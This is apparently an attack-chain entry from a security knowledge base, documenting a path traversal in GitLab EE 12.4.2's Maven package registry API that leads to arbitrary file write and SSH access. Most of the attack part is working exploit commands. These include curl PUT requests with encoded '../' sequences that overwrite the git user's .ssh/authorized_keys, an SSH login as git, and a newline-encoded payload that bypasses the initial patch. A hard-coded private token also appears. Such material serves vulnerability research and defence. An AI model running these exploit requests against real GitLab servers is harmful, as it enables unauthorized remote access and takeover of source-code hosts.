---
tags:
  - path-traversal
  - rce
  - gitlab
  - api-exploit
  - ssh-key-injection
type: attack_chain
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
platforms:
  - Linux
  - Docker
complexity: medium
procedures:
  - '[[procedures/Setup-GitLab-Project-and-Token]]'
  - '[[procedures/Exploit-Path-Traversal-via-Maven-API]]'
  - '[[procedures/Gain-SSH-Shell-Access]]'
  - '[[procedures/Verify-Exploitation-with-Docker]]'
  - '[[procedures/Bypass-Initial-Patch-with-Newline-Payload]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Data Manipulation]]'
description: >-
  Exploiting a path traversal vulnerability in GitLab's package registry API to
  achieve arbitrary file write and remote code execution via SSH key injection
skill_level: intermediate
impact_level: high
id: 4301befe-3262-48cc-b41e-2dcbec8113d0
created_at: '2025-12-11T03:47:39.683Z'
updated_at: '2025-12-11T03:47:39.683Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
  - '[[T1565]]'
---
# GitLab Package Registry Path Traversal to Arbitrary File Write and RCE

Multi-stage attack chain demonstrating path traversal exploitation in GitLab's Maven package registry API, leading to arbitrary file write as the 'git' user and subsequent remote code execution via SSH key injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Project] --> B[Create Token]
    B --> C[Exploit Traversal]
    C --> D[Gain SSH Access]
    D --> E[Verify & Bypass]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#9b59b6
```

## Prerequisites & Requirements

### Required Tools

- #curl
- [[tools/ssh]]
- #docker
- #gitlab-rake
- #find
- #cat

### Target Environment

- Linux with Docker
- GitLab EE 12.4.2-ee running on ports 80 and 22
- Services: PostgreSQL 10.9, Redis 3.2.12, GitLab Shell 10.2.0
- Tech Stack: Ruby 2.6.3, Grape 1.1.0, Git 2.22.0

### Initial Access Requirements

- Network access to GitLab API and SSH ports
- Ability to create projects and tokens in GitLab
- Attacker's SSH public key ready for upload

## Detailed Attack Procedures

### Step 1: Setup GitLab Project and Token - [[procedures/Setup-GitLab-Project-and-Token]]

**Procedure**: [[procedures/Setup-GitLab-Project-and-Token]]

**Objective**: Configure the GitLab instance with package registry enabled and create necessary project and API token for exploitation.

**Expected Output**: A project with package registry access and a valid personal access token.

**Success Indicators**:
- Package registry is enabled
- Project is created successfully
- Token is generated with API permissions

### Step 2: Exploit Path Traversal via Maven API - [[procedures/Exploit-Path-Traversal-via-Maven-API]]

**Procedure**: [[procedures/Exploit-Path-Traversal-via-Maven-API]]

**Objective**: Send a crafted PUT request using [[commands/curl-path-traversal-exploit]] to exploit path traversal and overwrite .ssh/authorized_keys with attacker's SSH public key.

Use [[commands/curl-path-traversal-exploit]] to upload the key:

```bash
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

**Expected Output**: Successful file upload response from GitLab API.

**Success Indicators**:
- HTTP 200 or success response
- File written to target path

### Step 3: Gain SSH Shell Access - [[procedures/Gain-SSH-Shell-Access]]

**Procedure**: [[procedures/Gain-SSH-Shell-Access]]

**Objective**: Connect to the GitLab server as the 'git' user using the injected SSH key for remote shell access.

Use [[commands/ssh-git-connect]] to establish the connection:

```bash
ssh git@10.26.0.5
```

**Expected Output**: Interactive shell as 'git' user on the server.

**Success Indicators**:
- Successful SSH authentication
- Command execution on the remote server

### Step 4: Verify Exploitation with Docker - [[procedures/Verify-Exploitation-with-Docker]]

**Procedure**: [[procedures/Verify-Exploitation-with-Docker]]

**Objective**: Inspect the Docker container to confirm the authorized_keys file has been overwritten.

Enter the container with [[commands/docker-exec-bash]]:

```bash
docker exec -ti gitlab_web_1 bash
```

Search for the file using [[commands/find-authorized-keys]]:

```bash
find . -name 'authorized_keys'
```

View contents with [[commands/cat-authorized-keys]]:

```bash
cat /var/opt/gitlab/.ssh/authorized_keys
```

**Expected Output**: Path to authorized_keys and display of the injected public key.

**Success Indicators**:
- File found at expected location
- Contents match uploaded key

### Step 5: Bypass Initial Patch with Newline Payload - [[procedures/Bypass-Initial-Patch-with-Newline-Payload]]

**Procedure**: [[procedures/Bypass-Initial-Patch-with-Newline-Payload]]

**Objective**: Demonstrate bypassing an initial patch using a newline in the filename with [[commands/curl-bypass-patch]].

Execute [[commands/curl-bypass-patch]]:

```bash
curl -H "Private-Token: xQsDqzWrsUKsNCwdtXGT" http://10.26.0.3/api/v4/projects/1/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/a%0a%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub; echo
```

**Expected Output**: JSON response confirming file write.

**Success Indicators**:
- Bypass successful despite patch
- File overwritten again

## Attack Chain Summary

### Key Achievements

1. Arbitrary file write via path traversal
2. SSH key injection for persistent access
3. Remote code execution as 'git' user

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]
- [[Data Manipulation]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Privilege Escalation]]

*Last updated: 2023-10-01*
